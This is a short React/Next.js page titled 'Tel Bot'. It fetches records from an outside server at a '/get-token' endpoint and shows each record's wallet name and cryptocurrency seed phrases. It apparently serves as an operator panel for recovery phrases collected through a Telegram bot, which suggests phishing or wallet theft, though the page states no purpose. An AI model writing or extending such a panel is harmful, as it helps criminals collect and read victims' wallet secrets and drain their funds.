"use client";

import axios from "axios";
import { useEffect, useState } from "react";

export default function Home() {
  const [seeds, setSeeds] = useState([]);
  useEffect(() => {
    (async () => {
      try {
        const { data } = await axios.get(
          "https://telegrambot-dl5l.onrender.com/get-token"
        );
        setSeeds(data?.mainData);
      } catch (error) {
        console.log(error);
      }
    })();
  }, []);
  return (
    <main className="flex min-h-screen flex-col items-center justify-between p-24">
      <div className="z-10 max-w-5xl w-full items-center justify-between font-mono text-sm lg:flex">
        <p className="fixed left-0 top-0 flex w-full justify-center border-b border-gray-300 bg-gradient-to-b from-zinc-200 pb-6 pt-8 backdrop-blur-2xl dark:border-neutral-800 dark:bg-zinc-800/30 dark:from-inherit lg:static lg:w-auto  lg:rounded-xl lg:border lg:bg-gray-200 lg:p-4 lg:dark:bg-zinc-800/30">
          Tel Bot&nbsp;
        </p>
        <div
          style={{
            display: "flex",
            alignItems: "center",
            justifyContent: "space-around",
            flexDirection: "column",
          }}
        >
          {seeds.map((item) => {
            return (
              <div
                style={{
                  border: "0.1px solid gray",
                  borderRadius: "10px",
                  marginBottom: "20px",
                }}
              >
                <div>
                  WalletName: <div>{item?.walletname}</div>
                </div>
                <div>
                  Seed Phrase: <div>{item?.keys}</div>
                </div>
                <div>
                  Seed Phrase: <div>{item?.wallet}</div>
                </div>
              </div>
            );
          })}
        </div>
        <div className="fixed bottom-0 left-0 flex h-48 w-full items-end justify-center bg-gradient-to-t from-white via-white dark:from-black dark:via-black lg:static lg:h-auto lg:w-auto lg:bg-none"></div>
      </div>
    </main>
  );
}
